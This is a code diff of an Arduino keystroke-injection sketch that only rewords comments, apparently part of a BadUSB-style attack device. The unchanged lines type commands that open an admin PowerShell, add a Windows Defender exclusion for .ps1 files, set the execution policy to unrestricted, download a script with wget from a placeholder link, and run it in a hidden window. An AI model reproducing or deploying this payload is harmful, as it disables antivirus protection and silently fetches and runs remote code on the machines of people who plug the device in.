@@ -9,7 +9,7 @@ void typeKey(int key){
 
 void setup()
 {
-  // Start Keyboard
+  // Start Keyboard and Mouse
   
   Keyboard.begin();
   
@@ -23,7 +23,7 @@ void setup()
 
   delay(500);
 
-  // Start powershell ad Admin
+  // Start powershell as Admin
 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
@@ -78,19 +78,19 @@ void setup()
 
   typeKey(KEY_RETURN);  
   
-  // Add exception in antivirus for ps1 extension
+  // Add exception for .ps1 files in antivirus
 
   Keyboard.print("Add-MpPreference -ExclusionExtension ps1 -Force");
 
   typeKey(KEY_RETURN);
   
-  // Allows all script to be executed on pc
+  // Disable script blocker
 
   Keyboard.print("Set-ExecutionPolicy unrestricted -Force");
 
   typeKey(KEY_RETURN);
   
-  // Download main script
+  // Download ps1 script
 
   Keyboard.print("wget LINK -OutFile ciaoV2.ps1");
 
@@ -98,7 +98,7 @@ void setup()
 
   delay(3500);
   
-  // Start main script
+  // Start ps1 script
   
   Keyboard.print("powershell.exe -noexit -windowstyle hidden -file ciaoV2.ps1");
 
